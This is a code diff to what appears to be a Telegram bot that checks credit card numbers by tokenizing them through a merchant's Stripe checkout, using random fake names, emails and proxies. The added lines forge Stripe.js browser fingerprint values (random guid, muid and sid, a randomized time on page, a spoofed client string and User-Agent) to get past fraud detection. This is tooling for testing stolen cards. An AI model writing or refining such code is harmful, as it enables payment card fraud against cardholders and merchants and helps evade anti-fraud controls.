@@ -4,6 +4,7 @@ import re
 import random
 import time
 import os
+import uuid
 import aiofiles
 from telethon import events, Button
 
@@ -86,10 +87,13 @@ def _random_name():
 async def _create_payment_method(session, cc, mes, ano, cvv, proxy):
     """Tokenize card with Stripe publishable key → PaymentMethod ID"""
     first, last = _random_name()
+    guid = str(uuid.uuid4())
+    muid = str(uuid.uuid4())
+    sid  = str(uuid.uuid4())
     headers = {
         'Authorization': f'Bearer {STRIPE_PK}',
         'Content-Type': 'application/x-www-form-urlencoded',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
         'Origin': STRIPE_SITE,
         'Referer': STRIPE_SITE + '/checkout/',
         'Stripe-Version': '2023-10-16',
@@ -103,6 +107,12 @@ async def _create_payment_method(session, cc, mes, ano, cvv, proxy):
         f'&billing_details[name]={first}+{last}'
         f'&billing_details[email]={_random_email()}'
         f'&billing_details[address][country]=US'
+        f'&payment_user_agent=stripe.js%2F6fd82394'
+        f'&time_on_page={random.randint(8000, 45000)}'
+        f'&guid={guid}'
+        f'&muid={muid}'
+        f'&sid={sid}'
+        f'&referrer={STRIPE_SITE}%2Fcheckout%2F'
     )
     try:
         async with session.post(
